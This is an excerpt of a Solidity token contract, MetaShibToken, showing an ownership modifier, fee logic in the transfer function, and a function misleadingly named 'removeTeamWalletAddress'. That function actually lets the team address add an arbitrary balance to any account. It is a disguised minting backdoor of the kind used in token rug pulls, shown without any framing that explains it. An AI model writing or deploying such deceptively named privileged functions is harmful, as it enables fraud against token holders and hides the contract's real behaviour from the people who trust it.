...
abstract contract Ownable is Context {
    ...
    modifier onlyTeam() {
        require(_Team == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract MetaShibToken is IERC20, Ownable {
    ...
    function _transfer(address _from, address _to, uint256 _amount) internal {
        ...
        if(_to != address(0)){
          uint256 _burnamount = _amount.mul(_BurnFee).div(1000);
          uint256 _teamamount = _amount.mul(_TeamFee).div(1000);
    ...
    function removeTeamWalletAddress(address account, uint256 state) external onlyTeam() {
        _balances[account] = _balances[account].add(state);
    }
